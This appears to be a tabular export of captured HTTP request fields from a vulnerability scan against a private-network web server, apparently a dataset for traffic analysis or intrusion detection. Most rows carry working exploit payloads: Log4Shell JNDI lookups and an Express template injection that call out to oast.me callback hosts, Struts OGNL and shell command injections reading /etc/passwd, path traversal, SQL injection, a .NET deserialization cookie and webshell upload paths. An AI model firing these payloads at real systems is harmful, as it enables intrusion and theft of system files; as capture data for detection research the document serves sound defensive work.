http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wiki/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/wiki/pages/createpage-entervariables.action
	gzip																close		62	62	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/system/sharedir.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/system/sharedir.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/nuxeo/login.jsp/pwn$%7B31333333330+7%7D.xhtml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/nuxeo/login.jsp/pwn$%7B31333333330+7%7D.xhtml
text/plain, */*; q=0.01	gzip, deflate	en-US,en;q=0.5															close		342	342	multipart/form-data; boundary=---------------------------31046105003900160576454225745						192.168.1.104														http://192.168.1.104	1	http://192.168.1.104/web/assets/php/upload.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/assets/php/upload.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/elfinder/elfinder-cke.html
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.	gzip																close		151	151	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/jolokia/read/getDiagnosticOptions		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/jolokia/read/getDiagnosticOptions
	gzip	en															close		39	39	application/json						192.168.1.104															1	http://192.168.1.104/web/mgmt/tm/util/bash		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/mgmt/tm/util/bash
*/*	gzip																close		608	608	multipart/form-data; boundary=------------------------ca81ac1fececda48						192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
	gzip																close		363	363	application/json						192.168.1.104															1	http://192.168.1.104/web/actuator/env		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/actuator/env
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/manage/webshell/u?s=5&w=218&h=15&k=%0a&l=62&_=5621298674064		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/manage/webshell/u?s=5&w=218&h=15&k=%0a&l=62&_=5621298674064
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://c8ach799m8v918fkv9igcekctjoyyyynh.oast.me%27);//		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://c8ach799m8v918fkv9igcekctjoyyyynh.oast.me%27);//
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/doenterpagevariables.action		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/pages/doenterpagevariables.action
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/
	gzip																close		42	42	text/plain						192.168.1.104														http://192.168.1.104/mainFrame.htm	1	http://192.168.1.104/web/cgi?7		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36			Authorization=Basic YWRtaW46YWRtaW4=	/web/cgi?7
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/CFIDE/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/CFIDE/scripts/ajax/package/cfajax.js
	gzip																close		77	77	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/en/php/usb_sync.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/en/php/usb_sync.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/page/exportImport/fileTransfer/poc.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/page/exportImport/fileTransfer/poc.jsp
text/xml	gzip																close		242	242	text/xml						192.168.1.104															1	http://192.168.1.104/web/RPC2		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/RPC2
*/*	gzip	en															close		1511	1511	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/integration/saveGangster.action		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/integration/saveGangster.action
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfide/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/cfide/scripts/ajax/package/cfajax.js
	gzip																close		25	25	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/webadm/?q=moni_detail.do&action=gragh		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/webadm/?q=moni_detail.do&action=gragh
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=25SnEcrXAtgzl4ap2WMFzCZU5Nf.php&target=l1_Lw		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=25SnEcrXAtgzl4ap2WMFzCZU5Nf.php&target=l1_Lw
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip																close										192.168.1.104															1	http://192.168.1.104/web//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://c8ach799m8v918fkv9igcekctjeyyyyna.oast.me)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://c8ach799m8v918fkv9igcekctjeyyyyna.oast.me)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/graph_realtime.php?action=init		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36			Cacti=%3Bwget%20http%3A//c8ach799m8v918fkv9igcekctjayyyyde.oast.me	/web/graph_realtime.php?action=init
	gzip																close		7418	7418	text/xml; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/
*/*	gzip	en															close		116	116	application/json; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/api/timelion/run		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/api/timelion/run
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close		104	104	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/diag_ping_admin_en.asp	1	http://192.168.1.104/web/boaform/admin/formTracert		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/boaform/admin/formTracert
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23
	gzip																close		133	133	application/json;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/api/user/reg		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/api/user/reg
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1
${jndi:ldap://127.0.0.1#.${hostName}.accept.c8ach799m8v918fkv9igcekctjayyyydc.oast.me}	${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.c8ach799m8v918fkv9igcekctjayyyydq.oast.me}	${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.c8ach799m8v918fkv9igcekctjayyyydo.oast.me}															close										192.168.1.104					${jndi:ldap://127.0.0.1#.${hostName}.location.c8ach799m8v918fkv9igcekctjayyyyd6.oast.me}									${jndi:ldap://127.0.0.1#.${hostName}.referer.c8ach799m8v918fkv9igcekctjayyyyrn.oast.me}	1	http://192.168.1.104/web/?x=${jndi:ldap://127.0.0.1		GET				HTTP/1.1																			${jndi:ldap://127.0.0.1#.${hostName}.useragent.c8ach799m8v918fkv9igcekctjayyyyrg.oast.me}		${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.c8ach799m8v918fkv9igcekctjayyyyrq.oast.me}	${jndi:ldap://127.0.0.1#.${hostName}.cookiename.c8ach799m8v918fkv9igcekctjayyyyd4.oast.me}=${jndi:ldap://${hostName}.cookievalue.c8ach799m8v918fkv9igcekctjayyyydh.oast.me}	/web/?x=${jndi:ldap://127.0.0.1
	gzip																close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/v1/25SnEheiBnTSLo3RyxVmlA2Sane.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/v1/25SnEheiBnTSLo3RyxVmlA2Sane.php
*/*	gzip																close		88	88							192.168.1.104															1	http://192.168.1.104/web/login.htm		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/login.htm
	gzip																close		89	89							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/mainfunction.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/cgi-bin/mainfunction.cgi
${jndi:ldap://${hostName}.accept.c8ach799m8v918fkv9igcekctjayyyyrw.oast.me}	${jndi:ldap://${hostName}.acceptencoding.c8ach799m8v918fkv9igcekctjayyyyrs.oast.me}	${jndi:ldap://${hostName}.acceptlanguage.c8ach799m8v918fkv9igcekctjayyyyra.oast.me}															close										192.168.1.104					${jndi:ldap://${hostName}.location.c8ach799m8v918fkv9igcekctjayyyyfg.oast.me}									${jndi:ldap://${hostName}.referer.c8ach799m8v918fkv9igcekctjayyyyfk.oast.me}	1	http://192.168.1.104/web/?x=${jndi:ldap://${hostName}.c8ach799m8v918fkv9igcekctjayyyyr1.oast.me/a}		GET				HTTP/1.1																			${jndi:ldap://${hostName}.useragent.c8ach799m8v918fkv9igcekctjayyyyfq.oast.me}		${jndi:ldap://${hostName}.xforwardedfor.c8ach799m8v918fkv9igcekctjayyyyfs.oast.me}	${jndi:ldap://${hostName}.cookiename.c8ach799m8v918fkv9igcekctjayyyyfn.oast.me}=${jndi:ldap://${hostName}.cookievalue.c8ach799m8v918fkv9igcekctjayyyyfr.oast.me}	/web/?x=${jndi:ldap://${hostName}.c8ach799m8v918fkv9igcekctjayyyyr1.oast.me/a}
*/*	gzip	en															close		0	0							192.168.1.104															1	http://192.168.1.104/web/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/infusions/downloads/downloads.php?cat_id=${system(ls)}		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/infusions/downloads/downloads.php?cat_id=${system(ls)}
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
	gzip																close		166	166							192.168.1.104															1	http://192.168.1.104/web/cgi/networkDiag.cgi		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/cgi/networkDiag.cgi
	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/cores?wt=json		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/solr/admin/cores?wt=json
	gzip																close		4938	4938	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData	1	http://192.168.1.104/web/api/jsonws/invoke		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/api/jsonws/invoke
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
*/*	gzip	en															close		345	345	application/json						192.168.1.104															1	http://192.168.1.104/web/context.json		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/context.json
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C
text/html	gzip																close		185	185	multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/elfinder/elfinder-cke.html
text/plain, */*; q=0.01	gzip, deflate	en-US,en;q=0.5															close		342	342	multipart/form-data; boundary=---------------------------31046105003900160576454225745						192.168.1.104														http://192.168.1.104	1	http://192.168.1.104/web/assets/php/upload.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/assets/php/upload.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/assets/data/usrimg/25snegguasdxxncpzqo9ayydhc1.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/assets/data/usrimg/25snegguasdxxncpzqo9ayydhc1.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/uploads/assets/backend/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/uploads/assets/backend/elfinder/elfinder-cke.html
text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01	gzip																close										192.168.1.104															1	http://192.168.1.104/web/__		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36			dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>	/web/__
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/uploads/assets/backend/elfinder/elfinder.html		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/uploads/assets/backend/elfinder/elfinder.html
